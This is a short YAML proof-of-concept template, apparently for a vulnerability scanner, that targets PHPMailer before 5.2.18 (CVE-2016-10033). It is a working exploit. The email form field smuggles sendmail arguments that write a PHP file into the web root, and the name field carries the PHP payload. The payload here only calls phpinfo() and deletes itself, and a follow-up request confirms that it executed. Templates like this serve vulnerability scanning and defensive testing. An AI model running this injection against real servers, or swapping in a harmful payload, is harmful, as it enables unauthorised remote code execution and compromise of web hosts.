name: poc-yaml-phpmailer-cve-2016-10033
set:
  r1: randomInt(5, 10)
  r2: randomLowercase(r1)
rules:
  - method: POST
    path: /
    headers:
      Content-Type: "multipart/form-data; boundary=----{{r2}}"
    body: |
      ------{{r2}}
      Content-Disposition: form-data; name="action"

      submit
      ------{{r2}}
      Content-Disposition: form-data; name="name"

      <?php phpinfo();unlink('./{{r1}}.php')?>
      ------{{r2}}
      Content-Disposition: form-data; name="email"

      "vuln\" -OQueueDirectory=/tmp -X/var/www/html/{{r1}}.php server" @t.co
      ------{{r2}}
      Content-Disposition: form-data; name="message"

      Pwned
      ------{{r2}}--
    follow_redirects: false
    expression: |
      response.status == 200
  - method: GET
    path: /{{r1}}.php
    follow_redirects: false
    expression: |
        response.status == 200 && "PHP Version".bmatches(response.body)
detail:
  vulnType: PHPMailer < 5.2.18 远程命令执行漏洞
  author: supersalted(https://github.com/salted)
  links:
    - http://vulapps.evalbug.com/p_phpmailer_1/
